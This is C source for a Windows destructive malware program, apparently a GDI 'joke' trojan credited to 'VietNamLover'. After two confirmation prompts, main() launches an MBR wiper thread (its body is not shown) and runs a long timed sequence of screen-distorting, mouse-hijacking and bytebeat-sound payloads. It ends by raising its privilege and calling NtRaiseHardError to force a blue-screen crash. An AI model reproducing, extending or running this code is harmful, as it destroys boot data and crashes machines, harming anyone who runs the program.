        buf[t] = (char)( ( ((int)((t % 114000 < 3000) ? t * 5.992 : (t % 114000 < 6000) ? t * 5.992 : (t % 114000 < 9000) ? t * 5.992 : (t % 114000 < 11000) ? t * 5.656 : (t % 114000 < 13000) ? t * 5.04 : (t % 114000 < 19000) ? t * 5.656 : (t % 114000 < 23000) ? t * 6.728 : (t % 114000 < 25000) ? t * 4.488 : (t % 114000 < 27000) ? t * 5.04 : (t % 114000 < 29000) ? t * 5.656 : (t % 114000 < 33000) ? t * 5.656 : (t % 114000 < 37000) ? t * 5.656 : (t % 114000 < 40000) ? t * 5.656 : (t % 114000 < 42000) ? t * 5.04 : (t % 114000 < 44000) ? t * 4.488 : (t % 114000 < 49000) ? t * 4.24 : (t % 114000 < 51000) ? t * 3.36 : (t % 114000 < 55000) ? t * 3.36 : (t % 114000 < 57000) ? t * 3 : (t % 114000 < 61000) ? t * 2.832 : (t % 114000 < 64000) ? t * 5.992 : (t % 114000 < 67000) ? t * 5.992 : (t % 114000 < 70000) ? t * 5.992 : (t % 114000 < 72000) ? t * 5.656 : (t % 114000 < 74000) ? t * 5.04 : (t % 114000 < 80000) ? t * 5.656 : (t % 114000 < 84000) ? t * 6.728 : (t % 114000 < 86000) ? t * 4.488 : (t % 114000 < 88000) ? t * 5.04 : (t % 114000 < 90000) ? t * 5.656 : (t % 114000 < 94000) ? t * 5.656 : (t % 114000 < 98000) ? t * 5.656 : (t % 114000 < 101000) ? t * 5.656 : (t % 114000 < 103000) ? t * 5.04 : (t % 114000 < 105000) ? t * 4.488 : (t % 114000 < 114000) ? t * 4.24 : 0)) - (t << (t & 31)) ) );
    WAVEHDR hdr={buf,sizeof(buf),0,0,0,0,0,0};
    waveOutPrepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutWrite(h,&hdr,sizeof(WAVEHDR));
    waveOutUnprepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutClose(h);
}

VOID WINAPI sound10() {
    HWAVEOUT h; WAVEFORMATEX w = {WAVE_FORMAT_PCM,1,32768,32768,1,8,0};
    waveOutOpen(&h,WAVE_MAPPER,&w,0,0,CALLBACK_NULL);
    char buf[32768*30]={0};
    for (DWORD t=0; t<sizeof(buf); ++t)
        buf[t] = (char)( t * (t >> 6 | t >> ((t >> 11) & 31)) / 65536 );
    WAVEHDR hdr={buf,sizeof(buf),0,0,0,0,0,0};
    waveOutPrepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutWrite(h,&hdr,sizeof(WAVEHDR));
    waveOutUnprepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutClose(h);
}

VOID WINAPI sound11() {
    HWAVEOUT h; WAVEFORMATEX w = {WAVE_FORMAT_PCM,1,8000,8000,1,8,0};
    waveOutOpen(&h,WAVE_MAPPER,&w,0,0,CALLBACK_NULL);
    char buf[8000*30]={0};
    for (DWORD t=0; t<sizeof(buf); ++t)
        buf[t] = (char)( ( ((int)((t % 128000 < 4000) ? t * 3.728 : (t % 128000 < 8000) ? t * 5.592 : (t % 128000 < 12000) ? t * 3.728 : (t % 128000 < 16000) ? t * 5.592 : (t % 128000 < 18000) ? t * 4.986 : (t % 128000 < 20000) ? t * 5.586 : (t % 128000 < 22000) ? t * 4.986 : (t % 128000 < 24000) ? t * 4.436 : (t % 128000 < 28000) ? t * 4.185 : (t % 128000 < 32000) ? t * 3.314 : (t % 128000 < 36000) ? t * 3.728 : (t % 128000 < 40000) ? t * 5.592 : (t % 128000 < 44000) ? t * 3.728 : (t % 128000 < 48000) ? t * 5.592 : (t % 128000 < 50000) ? t * 4.986 : (t % 128000 < 52000) ? t * 5.586 : (t % 128000 < 54000) ? t * 4.986 : (t % 128000 < 56000) ? t * 4.436 : (t % 128000 < 60000) ? t * 6.628 : (t % 128000 < 64000) ? t * 5.592 : (t % 128000 < 68000) ? t * 3.728 : (t % 128000 < 72000) ? t * 5.592 : (t % 128000 < 76000) ? t * 3.728 : (t % 128000 < 80000) ? t * 5.592 : (t % 128000 < 82000) ? t * 4.986 : (t % 128000 < 84000) ? t * 5.586 : (t % 128000 < 86000) ? t * 4.986 : (t % 128000 < 88000) ? t * 4.436 : (t % 128000 < 92000) ? t * 4.185 : (t % 128000 < 96000) ? t * 3.314 : (t % 128000 < 100000) ? t * 3 : (t % 128000 < 104000) ? t * 5.592 : (t % 128000 < 108000) ? t * 3 : (t % 128000 < 112000) ? t * 5.592 : (t % 128000 < 114000) ? t * 4.986 : (t % 128000 < 116000) ? t * 5.586 : (t % 128000 < 118000) ? t * 4.986 : (t % 128000 < 120000) ? t * 4.436 : (t % 128000 < 124000) ? t * 6.628 : (t % 128000 < 128000) ? t * 5.592 : 0)) + (t * 2) | t >> ((t & 1024) ? 4 : 9) & t >> ((t & 8192) ? ((t & 2048) ? 8 : 3) : 2) ) );
    WAVEHDR hdr={buf,sizeof(buf),0,0,0,0,0,0};
    waveOutPrepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutWrite(h,&hdr,sizeof(WAVEHDR));
    waveOutUnprepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutClose(h);
}

VOID WINAPI sound12() {
    HWAVEOUT h; WAVEFORMATEX w = {WAVE_FORMAT_PCM,1,12800,12800,1,8,0};
    waveOutOpen(&h,WAVE_MAPPER,&w,0,0,CALLBACK_NULL);
    char buf[12800*30]={0};
    for (DWORD t=0; t<sizeof(buf); ++t)
        buf[t] = (char)((int)((t % 88000 < 4000) ? (t * 12.65) : (t % 88000 < 8000) ? (t * 14.19) : (t % 88000 < 12000) ? (t * 9.47) : (t % 88000 < 16000) ? (t * 8.44) : (t % 88000 < 20000) ? (t * 9.47) : (t % 88000 < 24000) ? (t * 8.44) : (t % 88000 < 28000) ? (t * 12.65) : (t % 88000 < 32000) ? (t * 14.19) : (t % 88000 < 36000) ? (t * 9.47) : (t % 88000 < 40000) ? (t * 8.44) : (t % 88000 < 44000) ? (t * 9.47) : (t % 88000 < 48000) ? (t * 8.44) : (t % 88000 < 52000) ? (t * 12.65) : (t % 88000 < 56000) ? (t * 14.19) : (t % 88000 < 60000) ? (t * 9.47) : (t % 88000 < 64000) ? (t * 8.44) : (t % 88000 < 68000) ? (t * 9.47) : (t % 88000 < 72000) ? (t * 8.44) : (t % 88000 < 76000) ? (t * 11.312) : (t % 88000 < 80000) ? (t * 10.68) : (t % 88000 < 84000) ? (t * 9.512) : (t % 88000 < 88000) ? (t * 8.472) : 0) | t);
    WAVEHDR hdr={buf,sizeof(buf),0,0,0,0,0,0};
    waveOutPrepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutWrite(h,&hdr,sizeof(WAVEHDR));
    waveOutUnprepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutClose(h);
}

VOID WINAPI sound13() {
    HWAVEOUT h; WAVEFORMATEX w = {WAVE_FORMAT_PCM,1,12500,12500,1,8,0};
    waveOutOpen(&h,WAVE_MAPPER,&w,0,0,CALLBACK_NULL);
    char buf[12500*30]={0};
    for (DWORD t=0; t<sizeof(buf); ++t)
        buf[t] = (char)( ( ((int)((t % 128000 < 2000) ? t * 4.488 : (t % 128000 < 4000) ? t * 5.656 : (t % 128000 < 6000) ? t * 6.728 : (t % 128000 < 10000) ? t * 7.552 : (t % 128000 < 14000) ? t * 4.488 : (t % 128000 < 18000) ? t * 6.728 : (t % 128000 < 22000) ? t * 4.488 : (t % 128000 < (22000 + (4000 / 3) * 2)) ? t * 4.24 : (t % 128000 < (22000 + (4000 / 3) * 4)) ? t * 6.728 : (t % 128000 < 32000) ? t * 5.656 : (t % 128000 < 34000) ? t * 4.488 : (t % 128000 < 36000) ? t * 5.656 : (t % 128000 < 38000) ? t * 6.728 : (t % 128000 < 42000) ? t * 7.552 : (t % 128000 < 46000) ? t * 4.488 : (t % 128000 < 50000) ? t * 6.728 : (t % 128000 < 54000) ? t * 4.488 : (t % 128000 < (54000 + (4000 / 3) * 2)) ? t * 4.24 : (t % 128000 < (54000 + (4000 / 3) * 4)) ? t * 6.728 : (t % 128000 < 64000) ? t * 5.656 : (t % 128000 < 66000) ? t * 8.976 : (t % 128000 < 68000) ? t * 10.08 : (t % 128000 < 70000) ? t * 11.312 : (t % 128000 < 74000) ? t * 22.624 : (t % 128000 < 78000) ? t * 13.456 : (t % 128000 < 82000) ? t * 20.184 : (t % 128000 < 86000) ? t * 13.456 : (t % 128000 < (86000 + (4000 / 3) * 2)) ? t * 11.312 : (t % 128000 < (86000 + (4000 / 3) * 4)) ? t * 17.96 : (t % 128000 < 96000) ? t * 13.456 : (t % 128000 < 98000) ? t * 4.488 : (t % 128000 < 100000) ? t * 5.656 : (t % 128000 < 102000) ? t * 6.728 : (t % 128000 < 106000) ? t * 7.552 : (t % 128000 < 110000) ? t * 4.488 : (t % 128000 < 114000) ? t * 6.728 : (t % 128000 < 118000) ? t * 4.488 : (t % 128000 < (118000 + (4000 / 3) * 2)) ? t * 4.232 : (t % 128000 < (118000 + (4000 / 3) * 4)) ? t * 5.04 : (t % 128000 < 128000) ? t * 4.488 : 0)) | (t & 4096 ? t / 2 * (t ^ (t % 256)) | (t >> 5) : t / 8) | (t & 8192 ? 5 : (8 * t) >> (t & 31)) ) );
    WAVEHDR hdr={buf,sizeof(buf),0,0,0,0,0,0};
    waveOutPrepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutWrite(h,&hdr,sizeof(WAVEHDR));
    waveOutUnprepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutClose(h);
}

VOID WINAPI sound14() {
    HWAVEOUT h; WAVEFORMATEX w = {WAVE_FORMAT_PCM,1,16384,16384,1,8,0};
    waveOutOpen(&h,WAVE_MAPPER,&w,0,0,CALLBACK_NULL);
    char buf[16384*30]={0};
    for (DWORD t=0; t<sizeof(buf); ++t)
        buf[t] = (char)((1 * (t + 11 >> (t >> 8 | t >> 15) | t >> 4 - 2)) * ((t >> 10 ^ t + (t >> 6 | 127) >> 10) | 2));
    WAVEHDR hdr={buf,sizeof(buf),0,0,0,0,0,0};
    waveOutPrepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutWrite(h,&hdr,sizeof(WAVEHDR));
    waveOutUnprepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutClose(h);
}

VOID WINAPI sound15() {
    HWAVEOUT h; WAVEFORMATEX w = {WAVE_FORMAT_PCM,1,15000,15000,1,8,0};
    waveOutOpen(&h,WAVE_MAPPER,&w,0,0,CALLBACK_NULL);
    char buf[15000*30]={0};
    for (DWORD t=0; t<sizeof(buf); ++t)
        buf[t] = (char)( ( ((int)((t % 55500 < 2500) ? t * 8.976 : (t % 55500 < 5000) ? t * 8.976 : (t % 55500 < 7500) ? t * 10.08 : (t % 55500 < 10000) ? t * 8.976 : (t % 55500 < 12500) ? t * 8.976 : (t % 55500 < 15000) ? t * 10.08 : (t % 55500 < 18000) ? t * 8.976 : (t % 55500 < 21000) ? t * 8 : (t % 55500 < 24000) ? t * 7.552 : (t % 55500 < 27000) ? t * 6.728 : (t % 55500 < 28500) ? t * 5.992 : (t % 55500 < 30000) ? t * 6.728 : (t % 55500 < 31500) ? t * 5.992 : (t % 55500 < 33000) ? t * 6.728 : (t % 55500 < 34500) ? t * 5.992 : (t % 55500 < 36000) ? t * 6.728 : (t % 55500 < 40000) ? t * 5.992 : (t % 55500 < 41500) ? t * 7.552 : (t % 55500 < 43000) ? t * 8 : (t % 55500 < 44500) ? t * 7.552 : (t % 55500 < 46000) ? t * 8 : (t % 55500 < 48500) ? t * 7.552 : (t % 55500 < 51000) ? t * 6.728 : (t % 55500 < 55500) ? t * 5.992 : 0)) >> (t & 31) ) );
    WAVEHDR hdr={buf,sizeof(buf),0,0,0,0,0,0};
    waveOutPrepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutWrite(h,&hdr,sizeof(WAVEHDR));
    waveOutUnprepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutClose(h);
}

VOID WINAPI sound16() {
    HWAVEOUT h; WAVEFORMATEX w = {WAVE_FORMAT_PCM,1,18000,18000,1,8,0};
    waveOutOpen(&h,WAVE_MAPPER,&w,0,0,CALLBACK_NULL);
    char buf[18000*30]={0};
    for (DWORD t=0; t<sizeof(buf); ++t)
        buf[t] = (char)(t << 1 ^ t >> 1 ^ t << 2 | ~t >> 4 & t << 4 & 0 - ~t >> 9);
    WAVEHDR hdr={buf,sizeof(buf),0,0,0,0,0,0};
    waveOutPrepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutWrite(h,&hdr,sizeof(WAVEHDR));
    waveOutUnprepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutClose(h);
}

VOID WINAPI sound17() {
    HWAVEOUT h; WAVEFORMATEX w = {WAVE_FORMAT_PCM,1,18000,18000,1,8,0};
    waveOutOpen(&h,WAVE_MAPPER,&w,0,0,CALLBACK_NULL);
    char buf[18000*30]={0};
    for (DWORD t=0; t<sizeof(buf); ++t)
        buf[t] = (char)((t << 1 ^ t >> 2 ^ t << 3 | ~t >> 4 & ~t << 4 & 0 - t >> 8) - ((t % 128000 < 4000) ? (t * 3.728) : (t % 128000 < 8000) ? (t * 5.592) : (t % 128000 < 12000) ? (t * 3.728) : (t % 128000 < 16000) ? (t * 5.592) : (t % 128000 < 18000) ? (t * 4.986) : (t % 128000 < 20000) ? (t * 5.586) : (t % 128000 < 22000) ? (t * 4.986) : (t % 128000 < 24000) ? (t * 4.436) : (t % 128000 < 28000) ? (t * 4.185) : (t % 128000 < 32000) ? (t * 3.314) : (t % 128000 < 36000) ? (t * 3.728) : (t % 128000 < 40000) ? (t * 5.592) : (t % 128000 < 44000) ? (t * 3.728) : (t % 128000 < 48000) ? (t * 5.592) : (t % 128000 < 50000) ? (t * 4.986) : (t % 128000 < 52000) ? (t * 5.586) : (t % 128000 < 54000) ? (t * 4.986) : (t % 128000 < 56000) ? (t * 4.436) : (t % 128000 < 60000) ? (t * 6.628) : (t % 128000 < 64000) ? (t * 5.592) : (t % 128000 < 68000) ? (t * 3.728) : (t % 128000 < 72000) ? (t * 5.592) : (t % 128000 < 76000) ? (t * 3.728) : (t % 128000 < 80000) ? (t * 5.592) : (t % 128000 < 82000) ? (t * 4.986) : (t % 128000 < 84000) ? (t * 5.586) : (t % 128000 < 86000) ? (t * 4.986) : (t % 128000 < 88000) ? (t * 4.436) : (t % 128000 < 92000) ? (t * 4.185) : (t % 128000 < 96000) ? (t * 3.314) : (t % 128000 < 100000) ? (t * 3) : (t % 128000 < 104000) ? (t * 5.592) : (t % 128000 < 108000) ? (t * 3) : (t % 128000 < 112000) ? (t * 5.592) : (t % 128000 < 114000) ? (t * 4.986) : (t % 128000 < 116000) ? (t * 5.586) : (t % 128000 < 118000) ? (t * 4.986) : (t % 128000 < 120000) ? (t * 4.436) : (t % 128000 < 124000) ? (t * 6.628) : (t % 128000 < 128000) ? (t * 5.592) : 0));
    WAVEHDR hdr={buf,sizeof(buf),0,0,0,0,0,0};
    waveOutPrepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutWrite(h,&hdr,sizeof(WAVEHDR));
    waveOutUnprepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutClose(h);
}

VOID WINAPI sound18() {
    HWAVEOUT h; WAVEFORMATEX w = {WAVE_FORMAT_PCM,1,8000,8000,1,8,0};
    waveOutOpen(&h,WAVE_MAPPER,&w,0,0,CALLBACK_NULL);
    char buf[8000*30]={0};
    for (DWORD t=0; t<sizeof(buf); ++t)
        buf[t] = (char)( t * (0x0039c5bb >> ((t >> 8) & 31)) | (t % 39) | (t >> 8) );
    WAVEHDR hdr={buf,sizeof(buf),0,0,0,0,0,0};
    waveOutPrepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutWrite(h,&hdr,sizeof(WAVEHDR));
    waveOutUnprepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutClose(h);
}

VOID WINAPI sound19() {
    HWAVEOUT h; WAVEFORMATEX w = {WAVE_FORMAT_PCM,1,8000,8000,1,8,0};
    waveOutOpen(&h,WAVE_MAPPER,&w,0,0,CALLBACK_NULL);
    char buf[8000*30]={0};
    for (DWORD t=0; t<sizeof(buf); ++t)
        buf[t] = (char)( (t | (t >> 8)) + (t | (~t >> 5)) - (t & (t << 5)) );
    WAVEHDR hdr={buf,sizeof(buf),0,0,0,0,0,0};
    waveOutPrepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutWrite(h,&hdr,sizeof(WAVEHDR));
    waveOutUnprepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutClose(h);
}

VOID WINAPI sound20() {
    HWAVEOUT h; WAVEFORMATEX w = {WAVE_FORMAT_PCM,1,8000,8000,1,8,0};
    waveOutOpen(&h,WAVE_MAPPER,&w,0,0,CALLBACK_NULL);
    char buf[8000*30]={0};
    for (DWORD t=0; t<sizeof(buf); ++t)
        buf[t] = (char)( 0x0039c5bb * t + 207944154 ^ t + (1 << ((((t >> 11) & (t >> 8) | (t >> 16)) & 31) % 20070831)) );
    WAVEHDR hdr={buf,sizeof(buf),0,0,0,0,0,0};
    waveOutPrepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutWrite(h,&hdr,sizeof(WAVEHDR));
    waveOutUnprepareHeader(h,&hdr,sizeof(WAVEHDR));
    waveOutClose(h);
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM w, LPARAM l) {
    if (msg == WM_DESTROY) PostQuitMessage(0);
    return DefWindowProc(hWnd, msg, w, l);
}

int CALLBACK eggwin(HINSTANCE hIns, HINSTANCE, LPSTR, int) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    ReleaseDC(0, hdc);
    WNDCLASS wc = {0};
    wc.hbrBackground = (HBRUSH)CreatePatternBrush(LoadBitmap(GetModuleHandle(0), MAKEINTRESOURCE(1)));
    wc.hIcon = LoadIcon(GetModuleHandle(0), MAKEINTRESOURCE(1));
    wc.hInstance = hIns;
    wc.lpfnWndProc = WndProc;
    wc.lpszClassName = "hexacbngdfgjgsffgh.exe";
    RegisterClass(&wc);
    HWND win = CreateWindowEx(WS_EX_CLIENTEDGE, "hexacbngdfgjgsffgh.exe", "name by Clutter xmodz",
        DS_MODALFRAME | DS_CENTER | WS_POPUP | WS_VISIBLE | WS_CAPTION | WS_SYSMENU,
        (w - 512) / 2, (h - 288) / 2, 512, 288, NULL, NULL, NULL, NULL);
    ShowWindow(win, SW_SHOW);
    UpdateWindow(win);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}

void aboutmsg() {
    MSGBOXPARAMSA p = {sizeof(p), 0, GetModuleHandle(0), 
                       "hexacbngdfgjgsffgh.exe", 
                       "name by Clutter xmodz", 
                       MB_OK | MB_USERICON | MB_DEFBUTTON1, 
                       MAKEINTRESOURCE(1), 0, 0, 0};
    MessageBoxIndirectA(&p);
}

// ---- MAIN ----
int main() {
    if (MessageBoxW(NULL, L"DO YOU WANT TO RUN THIS DESTRUCTIVE MALWARE?!", L"hexacbngdfgjgsffgh.exe by VietNamLover (name by Clutter xmodz)", 
                    MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    
    if (MessageBoxW(NULL, L"ARE YOU SURE?! IT WILL DESTROY YOUR SYSTEM!!!!!", 
                    L"hexacbngdfgjgsffgh.exe - LAST WARNING!", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }

    // Start MBR Wiper
    CreateThread(0, 0, MBRWiper, 0, 0, 0);
    Sleep(2000);

    sound1();
    HANDLE t1 = CreateThread(0,0,shader1,0,0,0);
    HANDLE t2 = CreateThread(0,0,rgb,0,0,0);
    HANDLE t3 = CreateThread(0,0,movescr,0,0,0);
    HANDLE t0 = CreateThread(0,0,movemouse,0,0,0);
    HANDLE t0p = CreateThread(0,0,mousemikucur,0,0,0);
    Sleep(30000);
    TerminateThread(t1,0); CloseHandle(t1);
    TerminateThread(t2,0); CloseHandle(t2);
    TerminateThread(t3,0); CloseHandle(t3);
    refreshscr();
    sound2();
    HANDLE t4 = CreateThread(0,0,spiral,0,0,0);
    HANDLE t5 = CreateThread(0,0,thirteen,0,0,0);
    Sleep(30000);
    TerminateThread(t4,0); CloseHandle(t4);
    TerminateThread(t5,0); CloseHandle(t5);
    refreshscr();
    TerminateThread(t0,0); CloseHandle(t0);
    TerminateThread(t0p,0); CloseHandle(t0p);

    sound3();
    HANDLE t0b = CreateThread(0,0,movemouse,0,0,0);
    HANDLE t0bp = CreateThread(0,0,mousemikucur,0,0,0);
    HANDLE t6 = CreateThread(0,0,manyicon,0,0,0);
    HANDLE t7 = CreateThread(0,0,shader2,0,0,0);
    Sleep(30000);
    TerminateThread(t7,0); CloseHandle(t7);
    refreshscr();
    sound4();
    HANDLE t8 = CreateThread(0,0,shader3,0,0,0);
    Sleep(30000);
    TerminateThread(t8,0); CloseHandle(t8);
    refreshscr();
    sound5();
    HANDLE t9 = CreateThread(0,0,cube,0,0,0);
    HANDLE t10 = CreateThread(0,0,shader4,0,0,0);
    Sleep(30000);
    TerminateThread(t10,0); CloseHandle(t10);
    refreshscr();
    TerminateThread(t6,0); CloseHandle(t6);
    refreshscr();
    TerminateThread(t9,0); CloseHandle(t9);
    TerminateThread(t0b,0); CloseHandle(t0b);
    TerminateThread(t0bp,0); CloseHandle(t0bp);

    sound6();
    HANDLE t0c = CreateThread(0,0,movemouse,0,0,0);
    HANDLE t0cp = CreateThread(0,0,mousemikucur,0,0,0);
    HANDLE t11 = CreateThread(0,0,silie,0,0,0);
    HANDLE t13 = CreateThread(0,0,transparent,0,0,0);
    HANDLE t14 = CreateThread(0,0,text,0,0,0);
    Sleep(30000);
    TerminateThread(t11,0); CloseHandle(t11);
    refreshscr();
    sound7();
    HANDLE t15 = CreateThread(0,0,shader5,0,0,0);
    Sleep(30000);
    TerminateThread(t13,0); CloseHandle(t13);
    TerminateThread(t15,0); CloseHandle(t15);
    refreshscr();
    sound8();
    HANDLE t16 = CreateThread(0,0,shader6,0,0,0);
    HANDLE t17 = CreateThread(0,0,gradient,0,0,0);
    Sleep(30000);
    TerminateThread(t16,0); CloseHandle(t16);
    refreshscr();
    sound9();
    HANDLE t18 = CreateThread(0,0,shader7,0,0,0);
    Sleep(30000);
    TerminateThread(t18,0); CloseHandle(t18);
    refreshscr();
    sound10();
    HANDLE t19 = CreateThread(0,0,transparent2,0,0,0);
    HANDLE t20 = CreateThread(0,0,melt,0,0,0);
    Sleep(30000);
    TerminateThread(t14,0); CloseHandle(t14);
    TerminateThread(t17,0); CloseHandle(t17);
    TerminateThread(t20,0); CloseHandle(t20);
    refreshscr();
    sound11();
    HANDLE t21 = CreateThread(0,0,melt2,0,0,0);
    HANDLE t22 = CreateThread(0,0,drawinverseproportionalfunctionicon,0,0,0);
    Sleep(30000);
    TerminateThread(t21,0); CloseHandle(t21);
    TerminateThread(t22,0); CloseHandle(t22);
    refreshscr();
    sound12();
    HANDLE t23 = CreateThread(0,0,melt3,0,0,0);
    HANDLE t24 = CreateThread(0,0,drawtancotfunctionicon,0,0,0);
    Sleep(30000);
    TerminateThread(t19,0); CloseHandle(t19);
    TerminateThread(t23,0); CloseHandle(t23);
    TerminateThread(t24,0); CloseHandle(t24);
    refreshscr();
    sound13();
    HANDLE t25 = CreateThread(0,0,ttrraaiinn,0,0,0);
    HANDLE t26 = CreateThread(0,0,text2,0,0,0);
    HANDLE t27 = CreateThread(0,0,anything,0,0,0);
    HANDLE t28 = CreateThread(0,0,drawmikuicon,0,0,0);
    Sleep(30000);
    TerminateThread(t25,0); CloseHandle(t25);
    refreshscr();
    sound14();
    HANDLE t29 = CreateThread(0,0,fastmove,0,0,0);
    HANDLE t30 = CreateThread(0,0,anyblt,0,0,0);
    HANDLE t31 = CreateThread(0,0,anyblt2,0,0,0);
    Sleep(30000);
    refreshscr();
    TerminateThread(t26,0); CloseHandle(t26);
    TerminateThread(t29,0); CloseHandle(t29);
    refreshscr();
    sound15();
    HANDLE t12 = CreateThread(0,0,silie2,0,0,0);
    HANDLE t32 = CreateThread(0,0,fastdown,0,0,0);
    HANDLE t33 = CreateThread(0,0,text3,0,0,0);
    Sleep(30000);
    TerminateThread(t12,0); CloseHandle(t12);
    TerminateThread(t32,0); CloseHandle(t32);
    refreshscr();
    sound16();
    HANDLE t34 = CreateThread(0,0,crushscr,0,0,0);
    HANDLE t35 = CreateThread(0,0,ColorInvert,0,0,0);
    Sleep(30000);
    TerminateThread(t27,0); CloseHandle(t27);
    TerminateThread(t30,0); CloseHandle(t30);
    TerminateThread(t31,0); CloseHandle(t31);
    TerminateThread(t34,0); CloseHandle(t34);
    TerminateThread(t35,0); CloseHandle(t35);
    refreshscr();
    sound17();
    HANDLE t36 = CreateThread(0,0,cosinescreen,0,0,0);
    HANDLE t37 = CreateThread(0,0,cosinescreen2,0,0,0);
    HANDLE t38 = CreateThread(0,0,pixel10proxl,0,0,0);
    HANDLE t39 = CreateThread(0,0,text4,0,0,0);
    HANDLE t40 = CreateThread(0,0,drawmikucur,0,0,0);
    Sleep(30000);
    TerminateThread(t36,0); CloseHandle(t36);
    TerminateThread(t37,0); CloseHandle(t37);
    refreshscr();
    sound18();
    HANDLE t41 = CreateThread(0,0,profect,0,0,0);
    Sleep(30000);
    TerminateThread(t33,0); CloseHandle(t33);
    TerminateThread(t41,0); CloseHandle(t41);
    refreshscr();
    sound19();
    HANDLE t42 = CreateThread(0,0,shader8,0,0,0);
    Sleep(30000);
    TerminateThread(t38,0); CloseHandle(t38);
    TerminateThread(t39,0); CloseHandle(t39);
    TerminateThread(t42,0); CloseHandle(t42);
    refreshscr();
    sound20();
    HANDLE t43 = CreateThread(0,0,shader9,0,0,0);
    Sleep(30000);
    TerminateThread(t28,0); CloseHandle(t28);
    TerminateThread(t40,0); CloseHandle(t40);
    TerminateThread(t43,0); CloseHandle(t43);
    refreshscr();
    TerminateThread(t0c,0); CloseHandle(t0c);
    TerminateThread(t0cp,0); CloseHandle(t0cp);

    // ========== BSOD TRIGGER (FINAL BLOW) ==========
    BOOLEAN bl;
    DWORD response;
    NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
    RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
    RtlAdjustPrivilege(19, 1, 0, &bl);
    NtRaiseHardError(0xC0000251, 0, 0, 0, 6, &response);

    Sleep(-1);
}